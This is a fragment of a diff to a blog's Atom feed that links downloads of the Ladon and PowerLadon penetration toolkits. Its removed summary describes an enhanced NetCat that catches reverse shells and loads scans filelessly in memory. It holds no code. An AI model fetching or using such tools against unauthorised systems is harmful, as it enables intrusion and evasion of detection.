title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.7版本：K8小密圈</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;K8加强版NC、NetCat,可监听执行windows\Linux\Mac等系统，或多种方式反弹的Shell,对于Windows还可以自动加密执行PowerShell、以及内存加载执行Ladon扫描（无文件落地）&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="netcat" scheme="http://k8gege.org/tags/netcat/"/>
     
   </entry>
   
